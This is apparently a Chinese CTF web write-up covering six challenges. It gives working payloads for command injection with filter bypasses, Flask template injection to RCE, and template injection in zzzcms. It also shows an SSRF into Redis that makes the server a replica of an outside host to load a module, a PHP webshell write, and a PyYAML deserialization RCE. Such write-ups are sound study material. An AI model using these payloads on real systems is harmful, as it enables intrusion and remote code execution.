# Command

没什么难度吧 就是空格绕过 加base64绕过

然后就是find命令找 flag地址

?url=127.0.0.1|find%09/%09-name%09`echo%09ZipsKmEqZyoK|base64%09-d`

1|ca\t%09/`echo%09L2V0Yy8uZmluZGZsYWcvZmxhZy50eHQ=|base64%09-d`

![图片](https://uploader.shimo.im/f/SH9ddFPsRJmP9y5J.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

# flaskbot

![图片](https://uploader.shimo.im/f/0Oy1JBdzEBVddWX2.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

提示flask就想到模板注入了，先试一下

![图片](https://uploader.shimo.im/f/U8b7VQ4bKMaKxvNR.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

看这样name好像没什么 试试num

首先因为是float 要用Nan绕过

![图片](https://uploader.shimo.im/f/YKjsNrHxFa5nWsYH.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

可以看到模板注入成功了

好像是个比数的 抓包看看东西 发现一个user的cookies

![图片](https://uploader.shimo.im/f/mwFDx3BkIdpbO26o.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

解开这个base64

![图片](https://uploader.shimo.im/f/czAUNWqsiA7JsCil.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

那么就直接想着rce 试一下直接读取 写在这里

payload:{{''.__class__.__mro__[2].__subclasses__()[258]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}

![图片](https://uploader.shimo.im/f/YmS6Epxn1Ujw85pt.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

cat 读取

![图片](https://uploader.shimo.im/f/BzdKOEWUOdFtKgDh.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

猜测是ban了flag

构造{{''.__class__.__mro__[2].__subclasses__()[258]('cat /super_secret_fl""ag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

![图片](https://uploader.shimo.im/f/hbBI1WJuhy6dGDls.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

## 

# easygogogo

![图片](https://uploader.shimo.im/f/SKokMeLekaDPQPjV.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

一个上传位点，直接想着上传几个shell上去发现都识别不了 想起来好像是go题目

抓包发现有一个这个

![图片](https://uploader.shimo.im/f/XcICBrUPyLBMd1Ev.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

解一下base64

![图片](https://uploader.shimo.im/f/YYnAbzihGKmlmTfx.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

然后就想着如果上传图片之后的cookeis会怎么样

![图片](https://uploader.shimo.im/f/8sG4jfGz0BlKHfKh.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

以前做过php的一道类似题目 目录穿越 先上传个"flag"文件，记录此时的cookies值，然后重启靶机替换即可

那么就先自己算一下穿越路径

../../../../../../flag

![图片](https://uploader.shimo.im/f/1QheLpuJBadTYJlv.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

记录此时的cookies 然后重发靶机

访问/show

![图片](https://uploader.shimo.im/f/G4AkaIgIX1wdtMHC.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

base64解密拿到flag





# easyzzz

提示是个zzzcms，直接搜索有两个洞

[https://cloud.tencent.com/developer/article/1576196](https://cloud.tencent.com/developer/article/1576196)

一个是sql，一个是命令注入，写在模版里的

![图片](https://uploader.shimo.im/f/nVUPP4d5h8mi6tKd.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

sql没绕过，我一直在被爬，（太草了

这个模板也ban了一点东西

但是 好像只是检测了if

![图片](https://uploader.shimo.im/f/RAYcevHZM3JRpkd6.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

payload：{i{cutpic:}f:111)echo `cat /flag` ;//}{end i{cutpic:}f}

进行图片裁切的方法卡在if中间即可bypass 最终payload:

# doyouknowssrf

![图片](https://uploader.shimo.im/f/W0CZMVS5CN2W2fHO.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

通读一下代码 发现是gactf ssrf原题魔改来的（离谱）

bypass parse_url 和curl的差异

[https://bugs.php.net/bug.php?id=77991](https://bugs.php.net/bug.php?id=77991)

绕过方法[http://root:root@127.0.0.1:5000@baidu.com/](http://eci-2ze4i20uld1wj0i48o5l.cloudeci1.ichunqiu.com/?url=http://root:root@127.0.0.1:5000@baidu.com/?url=http://127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520123.56.22.0%25206667%250d%250aquit%250a1)

![图片](https://uploader.shimo.im/f/Nzj8vu8bsRMlw6TH.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

再套一层

直接考虑写shell

两次编码

![图片](https://uploader.shimo.im/f/NnwG9MRSmgdDabjk.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

?url=[http://root:root@127.0.0.1:5000@baidu.com/](http://eci-2ze4i20uld1wj0i48o5l.cloudeci1.ichunqiu.com/?url=http://root:root@127.0.0.1:5000@baidu.com/?url=http://127.0.0.1:6379?%250D%250Aauth%2520123456%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520123.56.22.0%25206667%250d%250aquit%250a1)?url=http://127.0.0.1:6379?%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%32%30%25%37%37%25%36%35%25%36%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%30%25%32%32%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%36%35%25%36%33%25%36%38%25%36%66%25%32%30%25%36%30%25%36%33%25%36%31%25%37%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%36%30%25%33%62%25%33%66%25%33%65%25%32%32%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61%25%37%30%25%36%31%25%36%34%25%36%34%25%36%39%25%36%65%25%32%35%25%33%36

get flag

![图片](https://uploader.shimo.im/f/vHPf9ClytAfg7Aef.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

# profile system

目录穿越读到源码

[http://eci-2ze9ady2g3fv6zilv1wf.cloudeci1.ichunqiu.com:8888/uploads/../app.py](http://eci-2ze9ady2g3fv6zilv1wf.cloudeci1.ichunqiu.com:8888/uploads/../app.py)

```plain
from flask import Flask, render_template, request, flash, redirect, send_file,session
import os
import re
from hashlib import md5
import yaml
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = os.path.join(os.curdir, "uploads")
app.config['SECRET_KEY'] = 'Th1s_is_A_Sup333er_s1cret_k1yyyyy'
ALLOWED_EXTENSIONS = {'yaml','yml'}
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower()
@app.route("/")
def index():
    session['priviledge'] = 'guest'
    return render_template("home.html")
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    if file.filename == '':
        flash('No selected file')
        return redirect("/")
    elif not (allowed_file(file.filename) in ALLOWED_EXTENSIONS):
        flash('Please upload yaml/yml only.')
        return redirect("/")
    else:
        dirname = md5(request.remote_addr.encode()).hexdigest()
        filename = file.filename
        session['filename'] = filename 
        upload_directory = os.path.join(app.config['UPLOAD_FOLDER'], dirname)
        if not os.path.exists(upload_directory):
            os.mkdir(upload_directory)
        upload_path = os.path.join(app.config['UPLOAD_FOLDER'], dirname, filename)
        file.save(upload_path)
        return render_template("uploaded.html",path = os.path.join(dirname, filename))

@app.route("/uploads/<path:path>")
def uploads(path):
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], path))

@app.route("/view")
def view():
    dirname = md5(request.remote_addr.encode()).hexdigest()
    realpath = os.path.join(app.config['UPLOAD_FOLDER'], dirname,session['filename']).replace('..','')
    if session['priviledge'] =='elite' and os.path.isfile(realpath):
        try:
            with open(realpath,'rb') as f:
                data = f.read()
                if not re.fullmatch(b"^[ -\-/-\]a-}\n]*$",data, flags=re.MULTILINE):
                    info = {'user': 'elite-user'}
                    flash('Sth weird...')
                else:
                    info = yaml.load(data)
                if info['user'] == 'Administrator':
                    flash('Welcome admin!')
                else:
                    raise ()
        except:
            info = {'user': 'elite-user'}
    else:
        info = {'user': 'guest'}
    return render_template("view.html",user = info['user'])


if __name__ == "__main__":
    app.run('0.0.0.0',port=8888,threaded=True)
```
上传yaml文件，当session中user为elite时则load这个yaml。
拿着Th1s_is_A_Sup333er_s1cret_k1yyyyy构造得到cookie

![图片](https://uploader.shimo.im/f/f0oXkXLWSI8mFREl.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)


![图片](https://uploader.shimo.im/f/zvKwK4zzmRSyCJEv.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

[https://hackmd.io/@harrier/uiuctf20](https://hackmd.io/@harrier/uiuctf20)

看了下构造

```plain
a = "__import__('os').system('/readflag > ./uploads/edi')"
for i in range(len(a)):
    print(str(hex(ord(a[i]))).replace("0x",'\\x'),end='')
user: Administrator
A: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x2f\x72\x65\x61\x64\x66\x6c\x61\x67\x20\x3e\x20\x2e\x2f\x75\x70\x6c\x6f\x61\x64\x73\x2f\x65\x64\x69\x27\x29"
```
测试了下不出外网，readflag一下
```plain
GET /view HTTP/1.1
Host: eci-2ze9ady2g3fv6zilv1wf.cloudeci1.ichunqiu.com:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://eci-2ze9ady2g3fv6zilv1wf.cloudeci1.ichunqiu.com:8888/upload
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1606035934; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1606035949; session=eyJmaWxlbmFtZSI6ImV4cC55bWwiLCJwcml2aWxlZGdlIjoiZWxpdGUifQ.X7pRIA.vjFwSoWHjNMkJR9Bhlk4cuDoz70
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
![图片](https://uploader.shimo.im/f/DG4i5Jbty3tASLKZ.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)

![图片](https://uploader.shimo.im/f/sxtn3CGvNVe8CCUZ.png!thumbnail?fileGuid=yvqeuh3767ALaYnV)





